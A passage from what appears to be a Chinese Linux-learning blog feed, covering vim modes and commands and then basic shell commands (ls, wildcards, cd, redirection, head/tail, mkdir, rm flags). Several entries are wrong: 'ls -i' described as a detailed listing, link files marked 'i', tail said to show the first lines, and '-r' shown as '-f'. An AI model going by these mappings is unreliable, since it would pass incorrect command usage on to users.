class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">v<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>按行移动，选中文本可视模式可以配合 d，y，&gt;&gt;，&lt;&lt; 实现对文本块的删除，复制，左右移动</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">V<br></code></pre></div></td></tr></table></figure><h3 id="1-4-输入模式"><a href="#1-4-输入模式" class="headerlink" title="1.4 输入模式"></a>1.4 输入模式</h3><h4 id="1-4-1-进入输入模式"><a href="#1-4-1-进入输入模式" class="headerlink" title="1.4.1 进入输入模式"></a>1.4.1 进入输入模式</h4><blockquote><ol><li>从光标之后开始输入</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">按 ESC 后按 a<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>在光标所在行的末尾开始输入</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">按 ESC 后按 A<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>从光标之前开始输入</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">按 ESC 后按 i<br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>从光标所在行第一个非空字符开始输入</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">按 ESC 后按 I<br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>在光标所在行下一行，另起一行开始输入</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">按 ESC 后按 o<br></code></pre></div></td></tr></table></figure><blockquote><ol start="6"><li>在光标所在行上一行，另起一行开始输入</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">按 ESC 后按 O<br></code></pre></div></td></tr></table></figure><blockquote><ol start="7"><li>删除光标所在字符开始输入</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">按 ESC 后按 s<br></code></pre></div></td></tr></table></figure><blockquote><ol start="8"><li>删除光标所在行开始输入</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">按 ESC 后按 S<br></code></pre></div></td></tr></table></figure><h3 id="1-5-末行模式"><a href="#1-5-末行模式" class="headerlink" title="1.5 末行模式"></a>1.5 末行模式</h3><p>进入末行模式。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">按 ESC 后按 Shift + 冒号<br></code></pre></div></td></tr></table></figure><h4 id="1-5-1-末行命令"><a href="#1-5-1-末行命令" class="headerlink" title="1.5.1 末行命令"></a>1.5.1 末行命令</h4><h5 id="1-5-1-1-光标"><a href="#1-5-1-1-光标" class="headerlink" title="1.5.1.1 光标"></a>1.5.1.1 光标</h5><p>光标跳转到第 n 行。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">n<br></code></pre></div></td></tr></table></figure><h5 id="1-5-1-2-存储"><a href="#1-5-1-2-存储" class="headerlink" title="1.5.1.2 存储"></a>1.5.1.2 存储</h5><blockquote><ol><li>保存文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">w<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>保存并退出文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">wq<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>保存并退出文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">x<br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>强制退出，不保存文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">q!<br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>强制退出，保存文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">wq!<br></code></pre></div></td></tr></table></figure><h5 id="1-5-1-3-查找"><a href="#1-5-1-3-查找" class="headerlink" title="1.5.1.3 查找"></a>1.5.1.3 查找</h5><blockquote><ol><li>/ ：正向查找，按 n 查看下一个</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">/sunck<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>? ：反向查找，按 n 查看上一个</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">?sunck<br></code></pre></div></td></tr></table></figure><h5 id="1-5-1-4-替换"><a href="#1-5-1-4-替换" class="headerlink" title="1.5.1.4 替换"></a>1.5.1.4 替换</h5><blockquote><ol><li>将光标所在行的第一个 sunck 替换为 lee</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">s/sunck/lee<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>将光标所在行的所有 sunck 替换为 lee</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">s/sunck/lee/g<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>将指定行的第一个 sunck 替换为 lee</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">n,s/sunck/lee<br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>将指定行的所有 sunck 替换为 lee</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">n,s/sunck/lee/g<br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>将每一行的第一个 sunck 替换为 lee </li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">%s/sunck/lee<br></code></pre></div></td></tr></table></figure><blockquote><ol start="6"><li>将每一行的所有 sunck 替换为 lee</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">%s/sunck/lee/g<br></code></pre></div></td></tr></table></figure><h5 id="1-5-1-5-设置"><a href="#1-5-1-5-设置" class="headerlink" title="1.5.1.5 设置"></a>1.5.1.5 设置</h5><blockquote><ol><li>显示行号</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> nu<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>取消显示行号</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> nonu<br></code></pre></div></td></tr></table></figure><h3 id="1-6-模式相互转换关系"><a href="#1-6-模式相互转换关系" class="headerlink" title="1.6 模式相互转换关系"></a>1.6 模式相互转换关系</h3><p><img src="https://img-blog.csdnimg.cn/20210524185109530.png"></p><h3 id="1-7-配置"><a href="#1-7-配置" class="headerlink" title="1.7 配置"></a>1.7 配置</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">vim ~/.vimrc<br></code></pre></div></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>Linux学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux学习-基本命令（一）</title>
    <link href="/2021/05/24/Linux%E5%AD%A6%E4%B9%A0/Linux%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2021/05/24/Linux%E5%AD%A6%E4%B9%A0/Linux%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>Linux，全称GNU/Linux，是一种免费使用和自由传播的类UNIX操作系统。主要受到Minix和Unix思想的启发，是一个基于POSIX的多用户、多任务、支持多线程和多CPU的操作系统。它能运行主要的Unix工具软件、应用程序和网络协议。它支持32位和64位硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。Linux有上百种不同的发行版。</p><p>Linux不仅系统性能稳定，而且是开源软件。其核心防火墙组件性能高效、配置简单，保证了系统的安全。在很多企业网络中，为了追求速度和安全，Linux不仅仅是被网络运维人员当作服务器使用，甚至当作网络防火墙。Linux具有开放源码、没有版权、技术社区用户多等特点，开放源码使得用户可以自由裁剪，灵活性高，功能强大，成本低。尤其系统中内嵌网络协议栈，经过适当的配置就可实现路由器的功能。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-文件管理"><a href="#1-文件管理" class="headerlink" title="1.文件管理"></a>1.文件管理</h2><h3 id="1-1-文件类型"><a href="#1-1-文件类型" class="headerlink" title="1.1 文件类型"></a>1.1 文件类型</h3><table><thead><tr><th align="center">符号</th><th align="center">文件类型</th></tr></thead><tbody><tr><td align="center">-</td><td align="center">普通文件</td></tr><tr><td align="center">d</td><td align="center">目录文件</td></tr><tr><td align="center">i</td><td align="center">链接文件</td></tr><tr><td align="center">c</td><td align="center">字符设备</td></tr><tr><td align="center">b</td><td align="center">块设备</td></tr></tbody></table><h3 id="1-2-ls-命令"><a href="#1-2-ls-命令" class="headerlink" title="1.2 ls 命令"></a>1.2 ls 命令</h3><blockquote><ol><li>显示当前目录下所有的文件和文件夹</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ls<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>显示指定目录下所有子目录与文件，包括隐藏文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ls -a<br></code></pre></div></td></tr></table></figure><p>其中，Linux文件或者目录名称最长可以有265个字符，点号（.）表示当前目录，两点（..）表示上一级目录，以点号（.）开头的文件为隐藏文件，需要用 -a 参数才能显示。</p><blockquote><ol start="3"><li>以列表方式显示文件的详细信息</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ls -i<br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>配合 -i 以人性化的方式显示文件大小</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ls -h<br></code></pre></div></td></tr></table></figure><h4 id="1-2-1-通配符"><a href="#1-2-1-通配符" class="headerlink" title="1.2.1 通配符"></a>1.2.1 通配符</h4><blockquote><ol><li>文件代表文件名中所有字符</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">*<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>查找以 te 开头的文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ls te*<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>查找结尾为 html 的文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ls *html<br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>代表文件名中任意一个字符</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">?<br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>只找 第一个字符任意，后缀为 .c 的文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ls ?.c<br></code></pre></div></td></tr></table></figure><blockquote><ol start="6"><li>只找 只有 3 个字符，前 2 个字符为 a. ，最后一个字符任意的文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ls a.?<br></code></pre></div></td></tr></table></figure><blockquote><ol start="7"><li>“[“ 和 “]” 将字符组括起来，表示可以匹配字符组中的任意一个。“-” 用于表示字符范围</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">[]<br></code></pre></div></td></tr></table></figure><blockquote><ol start="8"><li>匹配 a、b、c中任意一个</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">[abc]<br></code></pre></div></td></tr></table></figure><blockquote><ol start="9"><li>匹配从 a 到 f 范围内的任意一个字符</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">[a-f]<br></code></pre></div></td></tr></table></figure><blockquote><ol start="10"><li>找到从 a 到 f 范围内的任意一个字符开头的文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ls [a-f]*<br></code></pre></div></td></tr></table></figure><blockquote><ol start="11"><li>查找文件名为 a-f 的文件，当 “-” 处于方括号之外失去通配符的作用</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ls a-f<br></code></pre></div></td></tr></table></figure><blockquote><ol start="12"><li>如果要使通配符作为普通字符使用，可以在其前面加上转义字符。 “？” 和 “*”处于方括号内时不用使用转义字符就失去通配符的作用。</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">\<br></code></pre></div></td></tr></table></figure><blockquote><ol start="13"><li>查找文件名为 *a 的文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ls \*a<br></code></pre></div></td></tr></table></figure><h3 id="1-3-pwd-命令"><a href="#1-3-pwd-命令" class="headerlink" title="1.3 pwd 命令"></a>1.3 pwd 命令</h3><p>显示当前的工作目录。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">pwd</span><br></code></pre></div></td></tr></table></figure><h3 id="1-4-cd-命令"><a href="#1-4-cd-命令" class="headerlink" title="1.4 cd 命令"></a>1.4 cd 命令</h3><p>切换工作目录。需要注意的是，cd 后面可跟绝对路径，也可以跟相对路径</p><h4 id="1-4-1-特色用法"><a href="#1-4-1-特色用法" class="headerlink" title="1.4.1 特色用法"></a>1.4.1 特色用法</h4><blockquote><ol><li>切换到当前用户的主目录（/home/用户目录），用户登录的时候，默认的目录就是用户的主目录</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>切换到当前用户的主目录（/home/用户目录）</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>切换到当前目录</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> .<br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>切换到上级目录</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ..<br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>可进入上次所在的目录</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> -<br></code></pre></div></td></tr></table></figure><h3 id="1-5-gt-命令"><a href="#1-5-gt-命令" class="headerlink" title="1.5 &gt; 命令"></a>1.5 &gt; 命令</h3><p>输出重定向，Linux允许将命令执行结果重定向到一个文件，本应显示在终端上的内容保存到指定文件中。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ls &gt; tet.txt<br></code></pre></div></td></tr></table></figure><p>需要注意的是，如果文件不存在，则创建，存在则覆盖其内容。</p><h3 id="1-6-gt-gt-命令"><a href="#1-6-gt-gt-命令" class="headerlink" title="1.6 &gt;&gt; 命令"></a>1.6 &gt;&gt; 命令</h3><p>输出重定向，Linux允许将命令执行结果重定向到一个文件，本应显示在终端上的内容保存到指定文件中。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ls &gt;&gt; test.txt<br></code></pre></div></td></tr></table></figure><p>需要注意的是，如果文件不存在，则创建，存在则追加到文件尾部。</p><h3 id="1-7-cat-命令"><a href="#1-7-cat-命令" class="headerlink" title="1.7 cat 命令"></a>1.7 cat 命令</h3><p>查看或者合并文件内容。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">cat test1.txt test2.txt &gt; test.txt<br></code></pre></div></td></tr></table></figure><h3 id="1-8-head-命令"><a href="#1-8-head-命令" class="headerlink" title="1.8 head 命令"></a>1.8 head 命令</h3><p>查看文件。</p><blockquote><ol><li>默认显示前 10 行</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">head test.txt<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>显示前 n 行</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">head -n test.txt<br></code></pre></div></td></tr></table></figure><h3 id="1-9-tail-命令"><a href="#1-9-tail-命令" class="headerlink" title="1.9 tail 命令"></a>1.9 tail 命令</h3><p>查看文件。</p><blockquote><ol><li>默认显示前 10 行</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">tail test.txt<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>显示后 n 行</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">tail -n test.txt<br></code></pre></div></td></tr></table></figure><h3 id="1-10-less-命令"><a href="#1-10-less-命令" class="headerlink" title="1.10 less 命令"></a>1.10 less 命令</h3><p>查看文件。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">less<br></code></pre></div></td></tr></table></figure><p>敲 Enter 键往下走一行，敲空格键，往下走一页，可以向上翻页，键盘上的 pageup，pagedown。</p><h3 id="1-11-more-命令"><a href="#1-11-more-命令" class="headerlink" title="1.11 more 命令"></a>1.11 more 命令</h3><p>分屏显示，查看内容时，在信息过长无法在一屏上显示时，会出现快速滚屏，使得用户无法看清文件的内容，此时可以使用 more 命令，每次只显示一页，按下空格键可以显示下一页，按 q 键退出显示，按 h 键可以获取帮助。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">more<br></code></pre></div></td></tr></table></figure><h3 id="1-12-wc-命令"><a href="#1-12-wc-命令" class="headerlink" title="1.12 wc 命令"></a>1.12 wc 命令</h3><p>一次显示文件行数、字节数、文件名信息。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">wc<br></code></pre></div></td></tr></table></figure><h3 id="1-13-（管道）-命令"><a href="#1-13-（管道）-命令" class="headerlink" title="1.13 |（管道） 命令"></a>1.13 |（管道） 命令</h3><p>名称：管道。<br>一个命令的输出可以通过管道做为另一个命令的输入。<br>管道 我们可以理解现实生活中的管子，管子的一头塞东西进去，另一头取出来，这里 “|” 的左右分为两端，左端塞东西（写），右端取东西（读）。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">|<br></code></pre></div></td></tr></table></figure><h3 id="1-14-echo-命令"><a href="#1-14-echo-命令" class="headerlink" title="1.14 echo 命令"></a>1.14 echo 命令</h3><p>输出内容。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span><br></code></pre></div></td></tr></table></figure><h3 id="1-15-clear-命令"><a href="#1-15-clear-命令" class="headerlink" title="1.15 clear 命令"></a>1.15 clear 命令</h3><p>清除终端上的显示。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">clear<br></code></pre></div></td></tr></table></figure><h3 id="1-16-mkdir-命令"><a href="#1-16-mkdir-命令" class="headerlink" title="1.16 mkdir 命令"></a>1.16 mkdir 命令</h3><p>创建一个新的目录（文件夹）。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">mkdir <br></code></pre></div></td></tr></table></figure><p>需要注意的是，是新建目录的名称不能与当前目录中已有的目录或文件同名，并且目录创建者必须对当前目录具有写权限。</p><blockquote><ol><li>递归创建目录</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">mkdir a/b/c/d -p<br></code></pre></div></td></tr></table></figure><h3 id="1-17-touch-命令"><a href="#1-17-touch-命令" class="headerlink" title="1.17 touch 命令"></a>1.17 touch 命令</h3><p>创建一个新的普通文件。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">touch<br></code></pre></div></td></tr></table></figure><h3 id="1-18-rmdir-命令"><a href="#1-18-rmdir-命令" class="headerlink" title="1.18 rmdir 命令"></a>1.18 rmdir 命令</h3><p>删除一个目录。需要注意的是，目录必须为空目录。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rmdir<br></code></pre></div></td></tr></table></figure><h3 id="1-19-rm-命令"><a href="#1-19-rm-命令" class="headerlink" title="1.19 rm 命令"></a>1.19 rm 命令</h3><p>删除文件或目录，删除的文件不能恢复。</p><h3 id="1-19-1-参数"><a href="#1-19-1-参数" class="headerlink" title="1.19.1 参数"></a>1.19.1 参数</h3><blockquote><ol><li>-i    以进行交互式方式执行</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">-i<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>-f    强制删除，忽略不存在的文件，无需提示</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">-f<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>-r    递归地删除目录下的内容，删除文件夹时必须加此参数</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">-f<br></code></pre></div></td></tr></table></figure><h3 id="1-20-cp-命令"><a href="#1-20-cp-命令" class="headerlink" title="1.20 cp 命令"></a>1.20 cp 